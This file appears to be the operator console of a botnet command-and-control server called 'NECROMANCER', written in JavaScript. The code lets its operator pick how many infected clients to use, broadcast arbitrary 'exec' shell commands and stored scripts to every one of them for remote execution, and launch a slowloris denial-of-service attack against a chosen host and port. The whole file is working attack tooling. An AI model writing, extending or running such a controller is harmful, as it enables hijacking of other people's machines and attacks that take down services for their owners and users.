import readline from "readline";
import fs from "fs";
import { clientModules, broadcast } from "./server.js";
import help from "./help.json" assert { type: "json" };

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

export function prompt() {
  rl.question("\x1b[31m[NECROMANCER]\x1b[0m ", (message) => {
    message = message.toLowerCase();

    // Commands

    if (message.startsWith("instances")) {
      if (message === "instances") {
        console.log(`Instances: ${clientModules.clientInstances.length}`);
      } else if (message.split(" ")[1] <= clientModules.clients.length) {
        clientModules.clientInstances = [...clientModules.clients];
        clientModules.clientInstances = clientModules.clientInstances.slice(
          0,
          message.split(" ")[1]
        );
      }
    }

    if (message.split(" ")[1] === "all")
      clientModules.clientInstances = [...clientModules.clients];

    if (message.startsWith("help")) {
      if (message === "help") {
        console.log("Commands:");
        for (let i = 0; i < help.length; i++) {
          console.log(help[i].command);
        }
      } else if (
        help.filter((i) => i.command === message.split(" ")[1]).length >
        0
      ) {
        let commandIndex = help
          .map((i) => i.command)
          .indexOf(message.split(" ")[1]);

        console.log(
          `Functionality: ${help[commandIndex].functionality}\nUsage: ${help[commandIndex].usage}`
        );
      }
    }

    if (message.startsWith("silent")) {
      if (message === "silent") console.log(`silent: ${clientModules.silent}`);
      else if (message.split(" ")[1] === "true") {
        clientModules.silent = true;
      } else {
        clientModules.silent = false;
      }
    }

    // Commands, scripts and attacks

    if (message === "scripts") {
      listScripts();
    }

    if (message.startsWith("run")) {
      runScript(message.split(" ")[1]);
    }

    if (message.startsWith("slowloris")) {
      if (message === "slowloris") {
        console.log(
          "Please provide arguments: slowloris (host) (port) (duration ms) (sockets)"
        );
      } else if (message.split(" ")[1] !== undefined) {
        broadcast(message);
        console.log(
          ` Attack sent!`
        );
      }
    }

    if (message.startsWith("exec")) broadcast(message);

    return prompt();
  });
}

const scriptsDir = "../config/scripts";

function listScripts() {
  fs.readdir(scriptsDir, (err, files) => {
    console.log("\nList of scripts in script dir:");
    files.forEach((file) => {
      if (file !== "convert.ps1") console.log(`\x1b[34m${file}\x1b[0m`);
    });
    prompt();
  });
}

function runScript(scriptName) {
  fs.readdir(scriptsDir, (err, files) => {
    files.forEach((file) => {
      if (file === scriptName) {
        fs.readFile(`${scriptsDir}/${scriptName}`, "utf8", (err, data) => {
          console.log("\x1b[91mRunning script...\x1b[0m");
          broadcast(`exec ${data}`);
        });
      }
    });
    prompt();
  });
}
